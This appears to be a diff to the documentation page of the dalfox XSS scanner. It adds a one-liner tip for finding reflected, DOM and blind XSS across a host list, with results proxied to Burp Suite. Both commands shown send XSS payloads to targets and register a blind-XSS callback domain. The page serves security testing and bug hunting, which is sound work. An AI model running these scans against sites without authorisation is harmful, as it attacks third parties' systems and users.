@@ -13,3 +13,8 @@ permalink: /docs/tips/oneliner/
 ```
 ▶ cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
 ```
+* [Find XSS and Blind XSS, and send every request to burpsuite for more manual testing
+](https://twitter.com/Alra3ees/status/1407058456323014659)
+```
+▶ dalfox file hosts --mining-dom  --deep-domxss --ignore-return -b 'YOURS.xss.ht' --follow-redirects --proxy http://127.0.0.1:8080
+```
